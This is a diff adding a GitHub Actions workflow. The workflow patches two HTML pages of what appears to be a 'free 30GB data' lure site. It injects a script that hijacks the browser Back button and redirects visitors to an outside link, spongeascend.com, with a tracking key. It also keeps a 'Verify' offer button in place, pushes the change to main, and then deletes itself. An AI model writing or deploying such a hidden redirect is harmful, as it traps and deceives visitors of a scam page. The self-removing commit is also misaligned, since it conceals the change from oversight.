@@ -1,0 +1,76 @@
+name: Fix back redirect safely
+
+on:
+  push:
+    paths:
+      - '.github/workflows/fix-back-redirect-v2.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  patch:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Replace auto redirect code with back-only behavior
+        shell: python
+        run: |
+          import re
+          from pathlib import Path
+
+          files = [
+              Path('index.html'),
+              Path('Samu Kyautar 30GB Data A Kowane Layi.html'),
+          ]
+
+          back_url = 'https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b'
+          replacement = '''
+    <script>
+        (function () {
+            var backRedirectUrl = "https://spongeascend.com/tamt7741r?key=51beb06476ba544db62a36db1d10e11b";
+            if (window.history && window.history.pushState) {
+                window.history.pushState({ backRedirectGuard: true }, "", window.location.href);
+                window.addEventListener("popstate", function () {
+                    window.location.replace(backRedirectUrl);
+                }, { once: true });
+            }
+        })();
+    </script>'''
+
+          pattern = re.compile(
+              r'\s*<script>\s*window\.onhashchange\s*=\s*function\(\)\s*\{.*?\}\)\(window\);\s*</script>',
+              re.S,
+          )
+
+          for path in files:
+              text = path.read_text(encoding='utf-8')
+              updated, count = pattern.subn(replacement, text, count=1)
+              if count != 1:
+                  raise SystemExit(f'{path}: expected one legacy back-navigation block, found {count}')
+              if 'noBackPlease' in updated:
+                  raise SystemExit(f'{path}: legacy noBackPlease code still present')
+              if 'global.onhashchange' in updated:
+                  raise SystemExit(f'{path}: legacy global hash handler still present')
+              if 'window.onhashchange = function()' in updated:
+                  raise SystemExit(f'{path}: legacy window hash handler still present')
+              if updated.count('window.location.replace(backRedirectUrl)') != 1:
+                  raise SystemExit(f'{path}: expected exactly one back-only redirect')
+              if updated.count('id="offer2"') != 1:
+                  raise SystemExit(f'{path}: second Verify button changed unexpectedly')
+              path.write_text(updated, encoding='utf-8')
+
+          if files[0].read_bytes() != files[1].read_bytes():
+              raise SystemExit('HTML entry files are no longer identical')
+
+      - name: Commit fix and remove helper workflows
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add index.html "Samu Kyautar 30GB Data A Kowane Layi.html"
+          git rm .github/workflows/fix-back-redirect-v2.yml
+          git rm -f .github/workflows/fix-back-redirect.yml || true
+          git commit -m "Make back redirect trigger only on Back"
+          git push origin HEAD:main
